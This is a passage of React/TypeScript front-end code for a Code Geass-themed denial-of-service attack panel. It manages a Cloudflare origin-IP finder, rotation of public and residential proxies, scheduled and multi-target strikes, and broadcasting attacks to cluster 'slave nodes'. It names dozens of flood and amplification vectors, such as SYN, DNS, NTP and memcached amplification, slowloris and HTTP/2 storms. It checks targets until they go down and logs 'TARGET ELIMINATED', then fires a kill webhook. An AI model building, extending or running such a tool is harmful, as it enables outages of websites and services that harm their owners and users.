  const [isAnalyzing, setIsAnalyzing]   = useState(false);
  const [showAnalyze, setShowAnalyze]   = useState(false);

  /* Origin IP Finder */
  interface OriginFinding { source: string; host: string; ip: string; isCF: boolean; confidence: "high"|"medium"|"low"; }
  interface AsnInfo { asn: number; name: string; country: string; }
interface OriginResult { domain: string; isCloudflare: boolean; originIPs: string[]; asnInfo?: Record<string, AsnInfo>; findings: OriginFinding[]; crtHostsFound: number; tip: string; }
  const [originResult, setOriginResult]   = useState<OriginResult | null>(null);
  const [isFindingOrigin, setIsFindingOrigin] = useState(false);
  const [showOriginFinder, setShowOriginFinder] = useState(false);

  /* Proxy rotation */
  interface ProxyEntry { host: string; port: number; responseMs: number; type?: "http" | "socks5"; }
  interface ResidentialInfo { host: string; port: number; count: number; username?: string; }
  const [proxies, setProxies]             = useState<ProxyEntry[]>([]);
  const [proxyEnabled, setProxyEnabled]   = useState(false);
  const [proxyFetching, setProxyFetching] = useState(false);
  const [showProxyPanel, setShowProxyPanel] = useState(false);
  const [proxyLiveCount, setProxyLiveCount] = useState<number>(0);
  const [proxyIsFetching, setProxyIsFetching] = useState(false);
  const [proxyLastRefresh, setProxyLastRefresh] = useState<number>(0);
  const [residentialInfo, setResidentialInfo] = useState<ResidentialInfo | null>(null);
  const [showResForm, setShowResForm]       = useState(false);
  const [resFormHost, setResFormHost]       = useState("");
  const [resFormPort, setResFormPort]       = useState("8080");
  const [resFormUser, setResFormUser]       = useState("");
  const [resFormPass, setResFormPass]       = useState("");
  const [resFormCount, setResFormCount]     = useState("25");
  const [resSaving, setResSaving]           = useState(false);

  /* Toast notifications */
  const [toasts, setToasts] = useState<Toast[]>([]);

  /* App theme */
  const [theme, setTheme] = useState<AppTheme>(() =>
    (localStorage.getItem("lb-theme") as AppTheme) || "lelouch"
  );

  /* Domain success scores */
  const [domainScores, setDomainScores] = useState<Record<string, DomainScore>>(() => {
    try { return JSON.parse(localStorage.getItem("lb-domain-scores") || "{}"); } catch { return {}; }
  });

  /* Time remaining in current attack */
  const [timeRemaining, setTimeRemaining] = useState(0);

  /* Live active connection counter (slowloris / conn-flood / geass-override) */
  const [activeConns, setActiveConns] = useState(0);

  /* Geass Override launch flash effect */
  const [geassFlash, setGeassFlash] = useState(false);

  /* Cascade attack state */
  const [isCascading, setIsCascading] = useState(false);
  const [cascadePhase, setCascadePhase] = useState(0); // 1=conn-flood, 2=slowloris, 3=waf-bypass

  /* Auto-recon state */
  const [isAutoRecon, setIsAutoRecon] = useState(false);

  /* Attack scheduling */
  const [scheduleTime, setScheduleTime] = useState("");
  const [showSchedule, setShowSchedule] = useState(false);
  const [scheduleLoading, setScheduleLoading] = useState(false);
  const [scheduledList, setScheduledList] = useState<Array<{ id: string; target: string; scheduledAt: string; method: string; status: string }>>([]);

  /* AI Advisor */
  const [aiLoading, setAiLoading]   = useState(false);
  const [aiData,    setAiData]      = useState<Record<string, unknown> | null>(null);
  const [aiError,   setAiError]     = useState<string | null>(null);
  const [showAiModal, setShowAiModal] = useState(false);

  /* Residential proxy count (legacy — now tracked via residentialInfo) */
  const [residentialCount, setResidentialCount] = useState(0);

  /* Refs */
  const terminalRef    = useRef<HTMLDivElement>(null);
  const startTimeRef   = useRef<number | null>(null);
  const durationRef    = useRef(60);
  const isRunningRef   = useRef(false);
  const targetRef      = useRef("");

  /* Queries */
  const { data: methods = [] } = useListMethods();
  const createAttack = useCreateAttack();
  const stopAttack   = useStopAttack();
  const { data: stats, refetch: refetchStats } = useGetAttackStats({
    query: { queryKey: getGetAttackStatsQueryKey(), refetchInterval: 10000 },
  });
  const { data: currentAttack, refetch: refetchAttack } = useGetAttack(
    currentAttackId ?? 0,
    { query: { queryKey: getGetAttackQueryKey(currentAttackId ?? 0), enabled: currentAttackId !== null, refetchInterval: isRunning ? 3000 : false } }
  );
  const { data: allAttacks = [], refetch: refetchHistory } = useListAttacks(
    { query: { queryKey: getListAttacksQueryKey(), refetchInterval: showHistory ? 5000 : false } }
  );

  const addLog = useCallback((text: string, type: LogType = "info") => {
    setLogs(prev => [...prev.slice(-99), mkLog(text, type)]);
  }, []);

  /* ── Toast helper ── */
  const addToast = useCallback((type: Toast["type"], title: string, msg?: string) => {
    const id = Date.now().toString(36) + Math.random().toString(36).slice(2, 5);
    setToasts(prev => [...prev.slice(-3), { id, type, title, msg }]);
    setTimeout(() => setToasts(prev => prev.filter(t => t.id !== id)), 4200);
  }, []);

  /* ── Domain score helper ── */
  const recordDomainScore = useCallback((targetUrl: string, attackMethod: string, success: boolean) => {
    const key = getDomainKey(targetUrl);
    setDomainScores(prev => {
      const curr = prev[key] ?? { total: 0, downed: 0, lastMethod: "", lastSeen: 0 };
      const next: DomainScore = {
        total: curr.total + 1,
        downed: curr.downed + (success ? 1 : 0),
        lastMethod: attackMethod,
        lastSeen: Date.now(),
      };
      const updated = { ...prev, [key]: next };
      localStorage.setItem("lb-domain-scores", JSON.stringify(updated));
      return updated;
    });
  }, []);

  /* ── Theme class on body ── */
  useEffect(() => {
    document.body.classList.toggle("theme-suzaku", theme === "suzaku");
    localStorage.setItem("lb-theme", theme);
  }, [theme]);

  /* ── Time remaining countdown ── */
  useEffect(() => {
    if (!isRunning || startTimeRef.current === null) { setTimeRemaining(0); return; }
    const iv = setInterval(() => {
      const elapsed = (Date.now() - startTimeRef.current!) / 1000;
      const rem = Math.max(0, durationRef.current - elapsed);
      setTimeRemaining(Math.round(rem));
    }, 1000);
    return () => clearInterval(iv);
  }, [isRunning]);

  useEffect(() => { soundRef.current = soundEnabled; }, [soundEnabled]);
  useEffect(() => { setEntered(true); }, []);
  useEffect(() => {
    if (terminalRef.current) terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
  }, [logs]);

  /* ── Proxy stats — SSE real-time + polling fallback ── */
  useEffect(() => {
    let es: EventSource | null = null;
    let fallbackInterval: ReturnType<typeof setInterval> | null = null;
    let autoRefreshTimer: ReturnType<typeof setTimeout> | null = null;
    let sseConnected = false;

    // ── initial fetch of full proxy list (runs once) ──────────────────────
    async function fetchProxyList() {
      try {
        const r = await fetch(`${BASE}/api/proxies`);
        const d = await r.json() as {
          count: number; publicCount?: number; residentialCount?: number;
          proxies: ProxyEntry[]; residential?: ResidentialInfo | null;
        };
        if (d.proxies?.length > 0) setProxies(d.proxies);
        setProxyLiveCount(d.count);
        if (d.residential)             setResidentialInfo(d.residential);
        if ((d.residentialCount ?? 0) > 0) setResidentialCount(d.residentialCount ?? 0);
      } catch { /* ignore — API may be starting */ }
    }

    // ── SSE handler — called for every event ──────────────────────────────
    function applySnapshot(raw: string) {
      try {
        const d = JSON.parse(raw) as {
          proxyCount: number; fetching: boolean;
          residentialCount: number; residential: ResidentialInfo | null;
          activeAttacks?: number; ts: number;
        };
        setProxyLiveCount(d.proxyCount);
        setProxyIsFetching(d.fetching);
        if (d.residentialCount > 0) {
          setResidentialCount(d.residentialCount);
          if (d.residential) setResidentialInfo(d.residential);
        } else {
          setResidentialInfo(null);
          setResidentialCount(0);
        }
      } catch { /* malformed event */ }
    }

    // ── Connect SSE ───────────────────────────────────────────────────────
    function connectSSE() {
      if (typeof EventSource === "undefined") { startFallbackPolling(); return; }
      es = new EventSource(`${BASE}/api/events`);

      es.addEventListener("snapshot", (e: MessageEvent) => {
        sseConnected = true;
        applySnapshot((e as MessageEvent).data as string);
        // If SSE is working, stop fallback polling
        if (fallbackInterval) { clearInterval(fallbackInterval); fallbackInterval = null; }
      });

      es.addEventListener("update", (e: MessageEvent) => {
        applySnapshot((e as MessageEvent).data as string);
      });

      es.addEventListener("connected", () => { sseConnected = true; });

      es.onerror = () => {
        // SSE failed — fall back to polling
        if (!sseConnected) {
          es?.close();
          es = null;
          startFallbackPolling();
        }
      };
    }

    // ── Fallback polling (10s) ────────────────────────────────────────────
    function startFallbackPolling() {
      if (fallbackInterval) return;
      async function poll() {
        try {
          const [r, rs] = await Promise.all([
            fetch(`${BASE}/api/proxies/count`),
            fetch(`${BASE}/api/proxies/stats`),
          ]);
          const d  = await r.json() as { count: number; fetching: boolean; lastFetch: number };
          const ds = await rs.json() as { count: number; residentialCount?: number; residential?: ResidentialInfo | null };
          setProxyLiveCount(d.count);
          setProxyIsFetching(d.fetching);
          if (d.lastFetch) setProxyLastRefresh(d.lastFetch);
          if ((ds.residentialCount ?? 0) > 0) {
            setResidentialCount(ds.residentialCount ?? 0);
            if (ds.residential) setResidentialInfo(prev => prev ?? ds.residential!);
          } else if (ds.residentialCount === 0) {
            setResidentialInfo(null); setResidentialCount(0);
          }
        } catch { /* ignore */ }
      }
      void poll();
      fallbackInterval = setInterval(poll, 10_000);
    }

    // ── Boot ──────────────────────────────────────────────────────────────
    void fetchProxyList();
    connectSSE();

    // If SSE doesn't connect within 5s, start fallback
    const sseTimeout = setTimeout(() => {
      if (!sseConnected) { es?.close(); es = null; startFallbackPolling(); }
    }, 5_000);

    // Re-fetch full proxy list every 10 minutes
    autoRefreshTimer = setTimeout(function triggerRefresh() {
      void fetchProxyList();
      autoRefreshTimer = setTimeout(triggerRefresh, 10 * 60 * 1000);
    }, 10 * 60 * 1000);

    return () => {
      es?.close();
      if (fallbackInterval) clearInterval(fallbackInterval);
      if (autoRefreshTimer) clearTimeout(autoRefreshTimer);
      clearTimeout(sseTimeout);
    };
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  /* ── Node health polling — updates every 5s when cluster nodes are configured ── */
  useEffect(() => {
    if (clusterNodes.length === 0) { setNodeHealth([]); return; }
    const poll = async () => {
      try {
        const r = await fetch(`${BASE}/api/cluster/status`);
        if (r.ok) {
          const d = await r.json() as { nodes: { url: string; online: boolean; latencyMs: number; cpus?: number; freeMem?: number }[] };
          setNodeHealth(d.nodes ?? []);
        }
      } catch { /* ignore — API may be starting */ }
    };
    poll();
    const iv = setInterval(poll, 5000);
    return () => clearInterval(iv);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [clusterNodes.length]);

  /* Sync current packets/bytes to refs */
  useEffect(() => {
    if (!currentAttack) return;
    currentPacketsRef.current = currentAttack.packetsSent ?? 0;
    currentBytesRef.current   = currentAttack.bytesSent   ?? 0;
  }, [currentAttack]);

  /* Per-second metric calculation — polls /live endpoint at 500ms for real-time stats.
   * PPS is computed CLIENT-SIDE from totalPackets delta to avoid server-side timer drift.
   * EMA (α=0.35) smooths spikes so the display never "freezes" between server windows. */
  useEffect(() => {
    if (!isRunning) {
      setPps(0); setBps(0);
      prevLivePktsRef.current  = null;
      prevLiveBytesRef.current = null;
      prevLivePollMs.current   = null;
      emaPpsRef.current = 0;
      emaBpsRef.current = 0;
      return;
    }
    // Reset EMA + prev snapshot on attack start
    prevLivePktsRef.current  = null;
    prevLiveBytesRef.current = null;
    prevLivePollMs.current   = null;
    emaPpsRef.current = 0;
    emaBpsRef.current = 0;
    let lastLogMs = 0;
    const EMA_ALPHA = 0.35;

    const iv = setInterval(async () => {
      if (currentAttackId === null) return;
      const pollNow = Date.now();

      try {
        const r = await fetch(`${BASE}/api/attacks/${currentAttackId}/live`);
        if (!r.ok) return;
        const live = await r.json() as { pps: number; bps: number; totalPackets: number; totalBytes: number; conns: number; running: boolean };

        // Sync accumulator refs so progress bar + final count stay accurate
        if (live.totalPackets > currentPacketsRef.current) currentPacketsRef.current = live.totalPackets;
        if (live.totalBytes   > currentBytesRef.current)  currentBytesRef.current   = live.totalBytes;

        // Update live conn counter
        if (live.conns > 0) setActiveConns(live.conns);

        // Client-side PPS/BPS delta — immune to server-side 1s timer drift
        let rawPps = 0;
        let rawBps = 0;
        if (prevLivePktsRef.current !== null && prevLivePollMs.current !== null) {
          const dt = (pollNow - prevLivePollMs.current) / 1000; // seconds
          if (dt > 0) {
            rawPps = Math.max(0, (live.totalPackets - prevLivePktsRef.current) / dt);
            rawBps = Math.max(0, (live.totalBytes   - (prevLiveBytesRef.current ?? 0)) / dt);
          }
        }
        prevLivePktsRef.current  = live.totalPackets;
        prevLiveBytesRef.current = live.totalBytes;
        prevLivePollMs.current   = pollNow;

        // EMA smoothing — eliminates the brief 0-dip when server window resets
        const smoothPps = rawPps > 0
          ? EMA_ALPHA * rawPps + (1 - EMA_ALPHA) * emaPpsRef.current
          : emaPpsRef.current * 0.8; // decay slowly instead of dropping to 0
        const smoothBps = rawBps > 0
          ? EMA_ALPHA * rawBps + (1 - EMA_ALPHA) * emaBpsRef.current
          : emaBpsRef.current * 0.8;
        emaPpsRef.current = smoothPps;
        emaBpsRef.current = smoothBps;

        const displayPps = Math.round(smoothPps);
        const displayBps = Math.round(smoothBps);

        setPps(displayPps);
        setBps(displayBps);
        setPpsHistory(prev => [...prev.slice(-59), displayPps]);
        setBpsHistory(prev => [...prev.slice(-59), displayBps]);
        if (displayPps > peakPpsRef.current) { peakPpsRef.current = displayPps; setPeakPps(displayPps); }
        if (displayBps > peakBpsRef.current) { peakBpsRef.current = displayBps; setPeakBps(displayBps); }

        // Log at most once per 2s
        const now = Date.now();
        if (displayPps > 0 && now - lastLogMs >= 2000) {
          lastLogMs = now;
          const n = fmtNum(displayPps);
          const t = targetRef.current;
          let msgs: ((t: string, n: string) => string)[];
          const H2_LOG_SET  = new Set(["http2-flood","h2-settings-storm","hpack-bomb","http2-continuation","http-pipeline","http2-priority-storm","large-header-bomb","h2-ping-storm","waf-bypass","quic-flood"]);
          const AMP_LOG_SET = new Set(["dns-amp","ntp-amp","mem-amp","ssdp-amp","icmp-flood"]);
          const TLS_LOG_SET = new Set(["tls-renego","ssl-death","keepalive-exhaust","http-smuggling"]);
          const CONN_LOG_SET= new Set(["conn-flood","ws-flood","rudy-v2"]);
          const SLOW_LOG_SET= new Set(["slowloris","slow-read","rudy"]);
          const HTTP_LOG_SET= new Set(["http-flood","http-bypass","graphql-dos","cache-poison","xml-bomb","range-flood","app-smart-flood","http2-flood"]);
          const TCP_LOG_SET = new Set(["syn-flood","tcp-flood","tcp-ack","tcp-rst"]);
          const UDP_LOG_SET = new Set(["udp-flood","udp-bypass"]);
          if (method === "geass-override")       msgs = LOG_MSGS_GEASS;
          else if (H2_LOG_SET.has(method))       msgs = LOG_MSGS_H2;
          else if (SLOW_LOG_SET.has(method))     msgs = LOG_MSGS_SLOW;
          else if (CONN_LOG_SET.has(method))     msgs = LOG_MSGS_CONN;
          else if (TLS_LOG_SET.has(method))      msgs = LOG_MSGS_TLS;
          else if (AMP_LOG_SET.has(method))      msgs = LOG_MSGS_AMP;
          else if (HTTP_LOG_SET.has(method))     msgs = LOG_MSGS_HTTP;
          else if (TCP_LOG_SET.has(method))      msgs = LOG_MSGS_TCP;
          else if (UDP_LOG_SET.has(method))      msgs = LOG_MSGS_UDP;
          else                                   msgs = LOG_MSGS_HTTP;
          addLog(msgs[Math.floor(Math.random() * msgs.length)](t, n), "info");
          if (soundRef.current) playTone("tick");
        }
      } catch { /* ignore network blips */ }
    }, 500);
    return () => clearInterval(iv);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isRunning, method, addLog, currentAttackId]);

  /* Progress bar */
  useEffect(() => {
    if (!isRunning || startTimeRef.current === null) return;
    const iv = setInterval(() => {
      if (startTimeRef.current === null) return;
      const elapsed = (Date.now() - startTimeRef.current) / 1000;
      const pct = Math.min((elapsed / durationRef.current) * 100, 100);
      setProgress(pct);
      if (pct >= 100) {
        setIsRunning(false); isRunningRef.current = false;
        setProgress(100); setPps(0); setBps(0);
        setLastAtkPkts(currentPacketsRef.current);
        setLastAtkBytes(currentBytesRef.current);
        addLog(`👁 Operation complete — ${currentPacketsRef.current.toLocaleString()} requests sent in ${durationRef.current}s`, "success");
        if (soundRef.current) playTone("stop");
        if ("vibrate" in navigator) navigator.vibrate([100, 50, 100]);
        refetchStats(); refetchHistory();
        clearInterval(iv);
      }
    }, 500);
    return () => clearInterval(iv);
  }, [isRunning, addLog, refetchStats, refetchHistory]);

  /* Target monitoring — with latency tracking and consecutive-fail guard */
  useEffect(() => {
    if (!isRunning || !targetRef.current) return;
    let cancelled = false;

    const checkTarget = async () => {
      if (!isRunningRef.current || cancelled) return;
      try {
        const urlToCheck = targetRef.current;
        const res = await fetch(`${BASE}/api/check`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ url: urlToCheck }),
        });
        const data: CheckResult = await res.json();
        if (cancelled) return;

        // Track probe latency for sparkline + log significant spikes
        if (data.responseTime > 0) {
          setLatencyHistory(prev => {
            const next = [...prev.slice(-29), data.responseTime];
            if (next.length >= 4 && data.up) {
              const baseline = next.slice(0, -1).reduce((a, b) => a + b, 0) / (next.length - 1);
              const pct = Math.round(((data.responseTime - baseline) / baseline) * 100);
              if (pct >= 300) addLog(`🔥 LATENCY CRITICAL: ${data.responseTime}ms (+${pct}%) — server on the edge!`, "error");
              else if (pct >= 80) addLog(`⚠ Latency spike: ${data.responseTime}ms (+${pct}%) — server degrading...`, "warn");
            }
            return next;
          });
        }

        const prev = targetStatusRef.current;

        if (data.up) {
          consecutiveFailsRef.current = 0;
          targetStatusRef.current = "online";
          setTargetStatus("online");
          if (prev === "offline") {
            addLog(`⚠ Target RECOVERED: HTTP ${data.status} ${data.statusText} (${data.responseTime}ms) — Geass broken`, "warn");
          } else if (prev === "unknown") {
            addLog(`👁 Target baseline: ONLINE — HTTP ${data.status} ${data.statusText} (${data.responseTime}ms)`, "info");
          }
        } else {
          consecutiveFailsRef.current += 1;
          const fails = consecutiveFailsRef.current;
          if (fails < CONSECUTIVE_FAILS_TO_CONFIRM) {
            addLog(`⚠ Probe ${fails}/${CONSECUTIVE_FAILS_TO_CONFIRM}: ${urlToCheck} not responding (${data.responseTime}ms) — confirming...`, "warn");
          } else if (targetStatusRef.current !== "offline") {
            targetStatusRef.current = "offline";
            setTargetStatus("offline");
            addLog(`💥 TARGET DOWN! ${urlToCheck} — ${fails} consecutive probe failures — HTTP ${data.status || "OFFLINE"} (${data.responseTime}ms)`, "success");
            addLog(`💥 MISSION ACCOMPLISHED — TARGET ELIMINATED`, "success");
            addToast("geass", "MISSION ACCOMPLISHED", `${urlToCheck} — TARGET ELIMINATED`);
            recordDomainScore(urlToCheck, method, true);
            if (soundRef.current) playTone("kill");
            if ("vibrate" in navigator) navigator.vibrate([300, 100, 300, 100, 500]);
            // ★ Fire kill webhook via /api/notify (T004)
            if (webhookUrl.trim()) {
              fetch(`${BASE}/api/notify`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  webhookUrl: webhookUrl.trim(),
                  event: "kill",
                  target: urlToCheck,
                  method,
                  attackId: currentAttackId,
                }),
              }).catch(() => { /**/ });
            }
          }
          if (prev === "unknown" && fails === 1) {
            addLog(`👁 Target baseline: OFFLINE — ${urlToCheck} not responding`, "warn");
          }
        }
      } catch { /* skip */ }
    };

    const initialTimeout = setTimeout(checkTarget, 3000);
    const iv = setInterval(checkTarget, 6000);

    return () => {
      cancelled = true;
      clearTimeout(initialTimeout);
      clearInterval(iv);
      setTargetStatus("unknown");
      targetStatusRef.current = "unknown";
      consecutiveFailsRef.current = 0;
      setLatencyHistory([]);
    };
  }, [isRunning, addLog]);

  /* currentAttack refetch is handled by refetchInterval — no manual setInterval needed */

  /* Live active-connection reset — conns are now fetched by the per-second metric effect above */
  const CONN_TRACKING_METHODS = new Set(["slowloris","conn-flood","geass-override","rudy","ws-flood","rudy-v2","tls-renego","ssl-death","http2-continuation","keepalive-exhaust","slow-read"]);
  useEffect(() => {
    if (!isRunning || !CONN_TRACKING_METHODS.has(method)) {
      setActiveConns(0);
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isRunning, method]);

  /* Cluster: poll slave nodes and aggregate stats */
  useEffect(() => {
    if (!isRunning || clusterAttackIds.length === 0) {
      setClusterTotalPkts(0); setClusterTotalBytes(0); return;
    }
    const iv = setInterval(async () => {
      const results = await Promise.allSettled(
        clusterAttackIds.map(({ node, id }) =>
          fetch(`${node.replace(/\/$/, "")}/api/attacks/${id}`).then(r => r.json())
        )
      );
      let pkts = 0, bytes = 0;
      for (const r of results) {
        if (r.status === "fulfilled") { pkts += r.value.packetsSent ?? 0; bytes += r.value.bytesSent ?? 0; }
      }
      setClusterTotalPkts(pkts);
      setClusterTotalBytes(bytes);
    }, 1500);
    return () => clearInterval(iv);
  }, [isRunning, clusterAttackIds]);

  /* ── Actions ── */
  async function handleLaunch() {
    if (!target.trim()) { addLog("✕ No target — enter a URL or IP address.", "error"); return; }

    if (isRunning) {
      addLog("👁 Revoking Geass — halting strike...", "warn");
      if (currentAttackId !== null) {
        try {
          await stopAttack.mutateAsync({ id: currentAttackId });
          addLog("👁 Local node halted.", "success");
          addToast("stop", "Strike Halted", `${getDomainKey(targetRef.current)} — Geass revoked`);
          recordDomainScore(targetRef.current, method, targetStatus === "offline");
          if (soundRef.current) playTone("stop");
        } catch { addLog("✕ Failed to stop local attack.", "error"); }
      }
      // Stop extra targets
      for (const eid of extraAttackIds) {
        if (eid !== null) {
          try { await stopAttack.mutateAsync({ id: eid }); } catch { /* ignore */ }
        }
      }
      setExtraAttackIds([]);
      // Stop all cluster nodes
      if (clusterAttackIds.length > 0) {
        await Promise.allSettled(
          clusterAttackIds.map(({ node, id }) =>
            fetch(`${node.replace(/\/$/, "")}/api/attacks/${id}/stop`, { method: "POST" })
          )
        );
        addLog(`👁 Cluster halted — ${clusterAttackIds.length} slave node(s) disengaged.`, "warn");
        setClusterAttackIds([]);
      }
      setLastAtkPkts(currentPacketsRef.current + clusterTotalPkts);
      setLastAtkBytes(currentBytesRef.current + clusterTotalBytes);
      setIsRunning(false); isRunningRef.current = false;
      setProgress(0); setCurrentAttackId(null);
      setPps(0); setBps(0); setTargetStatus("unknown");
      if ("vibrate" in navigator) navigator.vibrate([100, 50, 100]);
      refetchHistory(); refetchStats();
      return;
    }

    // Auto-detect port: HTTPS targets → 443, DNS → 53, else 80
    const isHttpsTarget = /^https:/i.test(target.trim());
    const portFromTarget = (() => {
      try { const u = new URL(target.trim()); return parseInt(u.port, 10) || (u.protocol === "https:" ? 443 : 80); } catch { return isHttpsTarget ? 443 : 80; }
    })();
    const port = method.includes("dns") ? 53 : portFromTarget;
    if (method === "geass-override") {
      addLog(`👁 ABSOLUTE GEASS COMMAND — ARES OMNIVECT — target: ${target}`, "info");
      addLog(`  33-vector: H2RST+H2CONT+HPACK+WAF+WS+GQL+RUDY2+Cache+TLS+QUIC+SSL+ConnFlood+Slowloris+Pipeline+H2Storm+ICMP+DNS+NTP+Memc+SSDP+UDP+AppSmart+LargeHeader+H2Prio | ${threads} threads | ${duration}s`, "info");
    } else {
      addLog(`👁 Geass granted — target: ${target}`, "info");
      addLog(`  Vector: ${method.toUpperCase()} | Threads: ${threads} | Duration: ${duration}s`, "info");
    }
    if (soundRef.current) playTone("start");
    if ("vibrate" in navigator) navigator.vibrate([200]);
    if (proxyUsable) {
      const httpN   = proxies.filter(p => p.type !== "socks5").length;
      const socks5N = proxies.filter(p => p.type === "socks5").length;
      addLog(`👁 Proxy rotation enabled — ${proxies.length} proxies [HTTP:${httpN} SOCKS5:${socks5N}] for ${method}`, "success");
    }

    try {
      const result = await createAttack.mutateAsync({
        data: { target: target.trim(), port, method, duration, threads, webhookUrl: webhookUrl.trim() || null },
      });
      setCurrentAttackId(result.id);
      setIsRunning(true); isRunningRef.current = true;
      if (method === "geass-override") { setGeassFlash(true); setTimeout(() => setGeassFlash(false), 1600); }
      targetRef.current = target.trim();
      startTimeRef.current = Date.now();
      durationRef.current = duration;
      currentPacketsRef.current = 0; currentBytesRef.current = 0;
      lastPacketsRef.current = 0;   lastBytesRef.current = 0;
      peakPpsRef.current = 0; peakBpsRef.current = 0;
      setProgress(0); setPps(0); setBps(0); setPeakPps(0); setPeakBps(0); setPpsHistory([]); setBpsHistory([]);
      setLastAtkPkts(0); setLastAtkBytes(0); setClusterAttackIds([]); setClusterTotalPkts(0); setClusterTotalBytes(0);
      const mi = methodInfo(method);
      addLog(`👁 Strike launched [ID #${result.id}] — vector: ${method.toUpperCase()} [${mi.badge}]`, "success");
      addToast("launch", `Geass Activated`, `${method.toUpperCase()} → ${getDomainKey(target.trim())} [${duration}s]`);

      // Launch extra targets (multi-target mode)
      const activeExtras = extraTargets.filter(t => t.trim());
      if (activeExtras.length > 0) {
        const extraIds: (number | null)[] = [];
        for (const et of activeExtras) {
          try {
            const er = await createAttack.mutateAsync({
              data: { target: et.trim(), port, method, duration, threads: Math.max(1, Math.floor(threads * 0.5)), webhookUrl: null },
            });
            extraIds.push(er.id);
            addLog(`👁 Extra target launched [ID #${er.id}] → ${et}`, "success");
          } catch { extraIds.push(null); addLog(`✕ Extra target failed: ${et}`, "error"); }
        }
        setExtraAttackIds(extraIds);
      }

      // Fire to cluster nodes (with Smart LB if enabled)
      const activeCluster = clusterNodes.filter(n => n.trim());
      if (activeCluster.length > 0) {
        addLog(`👁 Broadcasting Geass to ${activeCluster.length} cluster node(s)${smartLB ? " [SMART LB]" : ""}...`, "info");
        const clusterResults = await Promise.allSettled(
          activeCluster.map((nodeUrl, nodeIdx) => {
            const assignedMethod = smartLB ? getSmartMethod(method, nodeIdx + 1) : method;
            return fetch(`${nodeUrl.replace(/\/$/, "")}/api/attacks`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ target: target.trim(), port, method: assignedMethod, duration, threads, webhookUrl: null }),
            })
            .then(r => r.json())
            .then((d: { id: number }) => ({ node: nodeUrl.replace(/\/$/, ""), id: d.id, assignedMethod }));
          })
        );
        const confirmed = clusterResults
          .filter(r => r.status === "fulfilled")
          .map(r => (r as PromiseFulfilledResult<{ node: string; id: number; assignedMethod: string }>).value);
        const failed = activeCluster.length - confirmed.length;
        setClusterAttackIds(confirmed);
        if (smartLB && confirmed.length > 0) {
          addLog(`👁 CLUSTER ACTIVE [SMART LB]: ${confirmed.length}/${activeCluster.length} nodes — ${confirmed.map((c, i) => `Node${i+1}:${c.assignedMethod}`).join(", ")}`, "success");
        } else {
          addLog(`👁 CLUSTER ACTIVE: ${confirmed.length}/${activeCluster.length} nodes online${failed > 0 ? ` (${failed} failed)` : ""} — ${confirmed.length + 1}x power`, "success");
        }
        if (confirmed.length > 0 && soundRef.current) playTone("start");
      }

      saveFavorite(target.trim()); refetchHistory(); refetchStats();
    } catch { addLog("✕ Launch failed — check backend connection.", "error"); }
  }

  function saveFavorite(url: string) {
    setFavorites(prev => {
      if (prev.includes(url)) return prev;
      const next = [url, ...prev].slice(0, 10);
      localStorage.setItem("lb-favorites", JSON.stringify(next)); return next;
    });
  }
  function removeFavorite(url: string) {
    setFavorites(prev => {
      const next = prev.filter(f => f !== url);
      localStorage.setItem("lb-favorites", JSON.stringify(next)); return next;
    });
  }

  function saveNamedTarget() {
    const url   = target.trim();
    const label = newNameLabel.trim() || url;
    if (!url) return;
    setNamedTargets(prev => {
      const next = [{ url, label }, ...prev.filter(n => n.url !== url)].slice(0, 15);
      localStorage.setItem("lb-named-targets", JSON.stringify(next)); return next;
    });
    setNewNameLabel("");
    addLog(`👁 Named target saved: "${label}" → ${url}`, "success");
  }
  function removeNamedTarget(url: string) {
    setNamedTargets(prev => {
      const next = prev.filter(n => n.url !== url);
      localStorage.setItem("lb-named-targets", JSON.stringify(next)); return next;
    });
  }

  function saveUserPreset() {
    const label = newPresetLabel.trim();
    if (!label) { addLog("✕ Enter a preset name.", "error"); return; }
    const preset: UserPreset = {
      id:         `${Date.now()}`,
      label,
      method,
      packetSize,
      duration,
      delay,
      threads,
    };
    setUserPresets(prev => {
      const next = [preset, ...prev].slice(0, 12);
      localStorage.setItem("lb-user-presets", JSON.stringify(next)); return next;
    });
    setNewPresetLabel("");
    addLog(`👁 Custom preset saved: "${label}" — ${method.toUpperCase()}, ${threads}T, ${duration}s`, "success");
  }
  function deleteUserPreset(id: string) {
    setUserPresets(prev => {
      const next = prev.filter(p => p.id !== id);
      localStorage.setItem("lb-user-presets", JSON.stringify(next)); return next;
    });
  }
  function applyUserPreset(p: UserPreset) {
    setMethod(p.method); setPacketSize(p.packetSize);
    setDuration(p.duration); setDelay(p.delay); setThreads(p.threads);
    addLog(`👁 Custom preset: "${p.label}" — ${p.method.toUpperCase()}, ${p.threads} threads, ${p.duration}s`, "info");
    if (soundRef.current) playTone("tick");
  }

  function applyPreset(p: Preset) {
    setMethod(p.method); setPacketSize(p.packetSize);
    setDuration(p.duration); setDelay(p.delay); setThreads(p.threads);
    addLog(`👁 Preset: ${p.label} — ${p.method.toUpperCase()}, ${p.threads} threads, ${p.duration}s`, "info");
    if (soundRef.current) playTone("tick");
  }
  function addClusterNode() {
    const url = clusterInput.trim().replace(/\/$/, "");
    if (!url) return;
    const next = [...new Set([...clusterNodes, url])].slice(0, 20);
    setClusterNodes(next);
    localStorage.setItem("lb-cluster-nodes", JSON.stringify(next));
    setClusterInput("");
    addLog(`👁 Cluster node added: ${url}`, "info");
  }
  function removeClusterNode(url: string) {
    const next = clusterNodes.filter(n => n !== url);
    setClusterNodes(next);
    localStorage.setItem("lb-cluster-nodes", JSON.stringify(next));
  }

  function handleClearLogs() { setLogs([mkLog("Terminal cleared.", "info")]); }
  function handleExportLogs() {
    const txt = logs.map(l => `[${new Date(l.ts).toISOString()}] [${l.type.toUpperCase()}] ${l.text}`).join("\n");
    const blob = new Blob([txt], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a"); a.href = url;
    a.download = `lelouch-log-${Date.now()}.txt`; a.click();
    URL.revokeObjectURL(url);
    addLog("👁 Logs exported.", "success");
  }
  async function handleAnalyze() {
    const urlToAnalyze = target.trim();
    if (!urlToAnalyze) { addLog("✕ Enter a target URL or IP to analyze.", "error"); return; }
